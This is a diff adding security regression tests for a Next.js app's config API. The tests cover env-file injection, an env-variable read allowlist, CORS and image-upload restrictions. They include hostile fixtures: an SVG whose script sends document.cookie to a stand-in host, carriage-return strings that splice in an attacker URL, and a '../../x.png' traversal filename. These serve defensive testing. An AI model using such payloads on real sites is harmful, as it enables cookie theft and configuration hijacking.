@@ -2,6 +2,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { NextRequest } from 'next/server';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+import { loadLikeNext } from '../helpers/next-env-loader';
 import {
   asAdmin,
   asPlainUser,
@@ -36,9 +37,12 @@ async function load<T>(modulePath: string): Promise<T> {
   return (await import(modulePath)) as T;
 }
 
-function uploadRequest(url: string, field: string, name: string, extra: Record<string, string>) {
+const PNG_BYTES = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3]);
+const SVG_BYTES = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//x/"+document.cookie)</script></svg>');
+
+function uploadRequest(url: string, field: string, name: string, extra: Record<string, string>, bytes: Uint8Array = PNG_BYTES) {
   const form = new FormData();
-  form.set(field, new File([new Uint8Array([1, 2, 3])], name, { type: 'image/png' }));
+  form.set(field, new File([new Uint8Array(bytes)], name, { type: 'image/png' }));
   for (const [key, value] of Object.entries(extra)) form.set(key, value);
   return new NextRequest(`http://localhost${url}`, { method: 'POST', body: form });
 }
@@ -188,6 +192,222 @@ describe('/api/config/upload-logo and upload-favicon', () => {
 
     expect(response.status).toBe(200);
     expect(publicFiles(env.dir)).toHaveLength(1);
+  });
+});
+
+describe('HI-01: env writers cannot inject, expand or splice', () => {
+  const SECRET_LINE = 'SUPABASE_SERVICE_ROLE_KEY=placeholder-secret-service-role';
+  const BASE = ['NEXT_PUBLIC_SUPABASE_URL=http://127.0.0.1:54321', SECRET_LINE, 'NEXT_PUBLIC_AI_PROVIDER=openrouter', ''].join('\n');
+
+  it('rag-prompt POST with a carriage return answers 400 and leaves the env file unchanged', async () => {
+    const env = makeEnvDir(BASE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/rag-prompt/route')>('@/app/api/config/rag-prompt/route');
+
+    const response = await route.POST(
+      request('/api/config/rag-prompt', {
+        method: 'POST',
+        body: { preContext: 'x\rNEXT_PUBLIC_SUPABASE_URL=https://attacker\rNEXT_PUBLIC_MYRAG_DEPLOYMENT_MODE=single-tenant' },
+      }),
+    );
+
+    expect(response.status).toBe(400);
+    expect(env.read()).toBe(BASE);
+  });
+
+  it('rag-prompt POST keeps dollar patterns, hashes and variable references as literal text', async () => {
+    const env = makeEnvDir(BASE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/rag-prompt/route')>('@/app/api/config/rag-prompt/route');
+    const pre = "# Rules\nCosts $5 and ${SUPABASE_SERVICE_ROLE_KEY} and $` and $& don't";
+
+    const response = await route.POST(request('/api/config/rag-prompt', { method: 'POST', body: { preContext: pre, postContext: 'Cite $1.' } }));
+
+    expect(response.status).toBe(200);
+    const loaded = loadLikeNext(env.read());
+    expect(loaded.RAG_PRE_CONTEXT.replace(/\n/g, '\\n')).toBe(pre.replace(/\n/g, '\\n'));
+    expect(loaded.RAG_POST_CONTEXT).toBe('Cite $1.');
+    expect(Object.keys(loaded).sort()).toEqual(
+      ['NEXT_PUBLIC_AI_PROVIDER', 'NEXT_PUBLIC_SUPABASE_URL', 'RAG_POST_CONTEXT', 'RAG_PRE_CONTEXT', 'SUPABASE_SERVICE_ROLE_KEY'].sort(),
+    );
+  });
+
+  it('models POST with $` and $\' in a display name writes the literal characters and adds no line', async () => {
+    const env = makeEnvDir(BASE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/models/route')>('@/app/api/config/models/route');
+    const names = ['$`', "$'", '$&', '${SUPABASE_SERVICE_ROLE_KEY}', "O'Brien #1 `x`"];
+
+    const response = await route.POST(
+      request('/api/config/models', {
+        method: 'POST',
+        body: {
+          provider: 'openai',
+          openaiModels: names.map((displayName, i) => ({ id: `m${i}`, displayName })),
+          openrouterModels: [],
+          groqModels: [],
+        },
+      }),
+    );
+
+    expect(response.status).toBe(200);
+    const loaded = loadLikeNext(env.read());
+    expect((JSON.parse(loaded.NEXT_PUBLIC_OPENAI_MODELS) as Array<{ displayName: string }>).map((m) => m.displayName)).toEqual(names);
+    expect(loaded.NEXT_PUBLIC_OPENAI_MODELS).not.toContain('placeholder-secret');
+    expect(loaded.NEXT_PUBLIC_AI_PROVIDER).toBe('openai');
+    expect(Object.keys(loaded).sort()).toEqual(
+      [
+        'NEXT_PUBLIC_AI_PROVIDER',
+        'NEXT_PUBLIC_GROQ_MODELS',
+        'NEXT_PUBLIC_OPENAI_MODELS',
+        'NEXT_PUBLIC_OPENROUTER_MODELS',
+        'NEXT_PUBLIC_SUPABASE_URL',
+        'SUPABASE_SERVICE_ROLE_KEY',
+      ].sort(),
+    );
+  });
+
+  it('models POST refuses a provider that is not one of the three', async () => {
+    const env = makeEnvDir(BASE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/models/route')>('@/app/api/config/models/route');
+
+    const response = await route.POST(
+      request('/api/config/models', {
+        method: 'POST',
+        body: { provider: 'x\rNEXT_PUBLIC_SUPABASE_URL=https://attacker', openaiModels: [], openrouterModels: [], groqModels: [] },
+      }),
+    );
+
+    expect(response.status).toBe(400);
+    expect(env.read()).toBe(BASE);
+  });
+
+  it('get-env answers only for an explicit list of public names', async () => {
+    makeEnvDir(['NEXT_PUBLIC_APP_NAME=Demo', 'NEXT_PUBLIC_SIDEBAR_BUTTON_TEXT=Docs', 'RAG_SYSTEM_PROMPT=placeholder-secret-prompt', ''].join('\n'));
+    vi.resetModules();
+    const route = await import('@/app/api/config/get-env/route');
+    const touched = ['NEXT_PUBLIC_SIDEBAR_BUTTON_TEXT', 'NEXT_PUBLIC_APP_NAME', 'NEXT_PUBLIC_SUPABASE_URL'];
+    const saved = Object.fromEntries(touched.map((name) => [name, process.env[name]]));
+    process.env.NEXT_PUBLIC_SIDEBAR_BUTTON_TEXT = 'Docs';
+    process.env.NEXT_PUBLIC_APP_NAME = 'Demo';
+    process.env.NEXT_PUBLIC_SUPABASE_URL = 'http://127.0.0.1:54321';
+
+    try {
+      const ok = await route.GET(request('/api/config/get-env?var=NEXT_PUBLIC_SIDEBAR_BUTTON_TEXT') as never);
+      expect((await ok.json()).value).toBe('Docs');
+
+      for (const name of ['RAG_SYSTEM_PROMPT', 'SUPABASE_SERVICE_ROLE_KEY', 'NEXT_PUBLIC_APP_NAME', 'NEXT_PUBLIC_SUPABASE_URL', 'NEXT_PUBLIC_SUPABASE_ANON_KEY']) {
+        const denied = await route.GET(request(`/api/config/get-env?var=${name}`) as never);
+        expect(denied.status).toBe(403);
+        expect(await denied.text()).not.toContain('placeholder-secret');
+      }
+    } finally {
+      for (const name of touched) {
+        if (saved[name] === undefined) delete process.env[name];
+        else process.env[name] = saved[name];
+      }
+    }
+  });
+});
+
+describe('LO-03 and LO-08: no wildcard CORS and no write on GET', () => {
+  it('config/models answers GET and POST without Access-Control-Allow-Origin and exposes no OPTIONS handler', async () => {
+    makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/models/route')>('@/app/api/config/models/route');
+
+    const get = await route.GET(request('/api/config/models'));
+    const post = await route.POST(request('/api/config/models', { method: 'POST', body: MODELS_BODY }));
+    const bad = await route.POST(request('/api/config/models', { method: 'POST', body: { provider: 'nope' } }));
+
+    for (const response of [get, post, bad]) expect(response.headers.get('access-control-allow-origin')).toBeNull();
+    expect((route as Record<string, unknown>).OPTIONS).toBeUndefined();
+  });
+
+  it('rag-prompt exposes no OPTIONS handler and answers without CORS headers', async () => {
+    makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/rag-prompt/route')>('@/app/api/config/rag-prompt/route');
+
+    expect((route as Record<string, unknown>).OPTIONS).toBeUndefined();
+    expect((await route.GET(request('/api/config/rag-prompt'))).headers.get('access-control-allow-origin')).toBeNull();
+  });
+
+  it('rag-prompt GET never writes the env file, even when it splits a legacy RAG_SYSTEM_PROMPT', async () => {
+    const legacy = ['RAG_SYSTEM_PROMPT=Be brief.\\n\\n{{context}}\\n\\nCite sources.', 'NEXT_PUBLIC_AI_PROVIDER=openrouter', ''].join('\n');
+    const env = makeEnvDir(legacy);
+    asAdmin(state);
+    const route = await load<typeof import('@/app/api/config/rag-prompt/route')>('@/app/api/config/rag-prompt/route');
+    const before = fs.statSync(env.envPath).mtimeMs;
+
+    const response = await route.GET(request('/api/config/rag-prompt'));
+    const body = await response.json();
+
+    expect(response.status).toBe(200);
+    expect(body.preContext).toBe('Be brief.');
+    expect(body.postContext).toBe('Cite sources.');
+    expect(env.read()).toBe(legacy);
+    expect(fs.statSync(env.envPath).mtimeMs).toBe(before);
+  });
+});
+
+describe('ME-06: raster images only', () => {
+  it.each([
+    ['logo.svg', SVG_BYTES],
+    ['logo.png', SVG_BYTES],
+    ['logo.png.svg', PNG_BYTES],
+    ['logo.html', new TextEncoder().encode('<html><script>1</script></html>')],
+  ])('upload-logo refuses %s and writes nothing', async (name, bytes) => {
+    const env = makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const logo = await load<typeof import('@/app/api/config/upload-logo/route')>('@/app/api/config/upload-logo/route');
+
+    const response = await logo.POST(uploadRequest('/api/config/upload-logo', 'logoFile', name, { logoType: 'header' }, bytes));
+
+    expect(response.status).toBe(400);
+    expect(publicFiles(env.dir)).toEqual([]);
+    expect(env.read()).toBe(ENV_FILE);
+  });
+
+  it.each([
+    ['favicon.svg', SVG_BYTES],
+    ['favicon.html', new TextEncoder().encode('<html></html>')],
+    ['favicon.ico', PNG_BYTES],
+  ])('upload-favicon refuses %s and writes nothing', async (name, bytes) => {
+    const env = makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const favicon = await load<typeof import('@/app/api/config/upload-favicon/route')>('@/app/api/config/upload-favicon/route');
+
+    const response = await favicon.POST(uploadRequest('/api/config/upload-favicon', 'favicon', name, {}, bytes));
+
+    expect(response.status).toBe(400);
+    expect(publicFiles(env.dir)).toEqual([]);
+  });
+
+  it('upload-favicon stores a real PNG under a fixed name and records the URL', async () => {
+    const env = makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const favicon = await load<typeof import('@/app/api/config/upload-favicon/route')>('@/app/api/config/upload-favicon/route');
+
+    const response = await favicon.POST(uploadRequest('/api/config/upload-favicon', 'favicon', '../../x.png', {}));
+
+    expect(response.status).toBe(200);
+    expect(publicFiles(env.dir).map((file) => path.relative(env.dir, file))).toEqual([path.join('public', 'favicon.png')]);
+    expect(loadLikeNext(env.read()).NEXT_PUBLIC_FAVICON_URL).toBe('/favicon.png');
+  });
+
+  it('upload-logo stores the logo under a server-chosen name and records the URL', async () => {
+    const env = makeEnvDir(ENV_FILE);
+    asAdmin(state);
+    const logo = await load<typeof import('@/app/api/config/upload-logo/route')>('@/app/api/config/upload-logo/route');
+
+    const response = await logo.POST(uploadRequest('/api/config/upload-logo', 'logoFile', 'a.PNG', { logoType: 'ai' }));
+    const body = await response.json();
+
+    expect(response.status).toBe(200);
+    expect(body.filePath).toMatch(/^\/logos\/ai\/ai-logo-\d+\.png$/);
+    expect(loadLikeNext(env.read()).NEXT_PUBLIC_AI_RESPONSE_LOGO_URL).toBe(body.filePath);
   });
 });
 
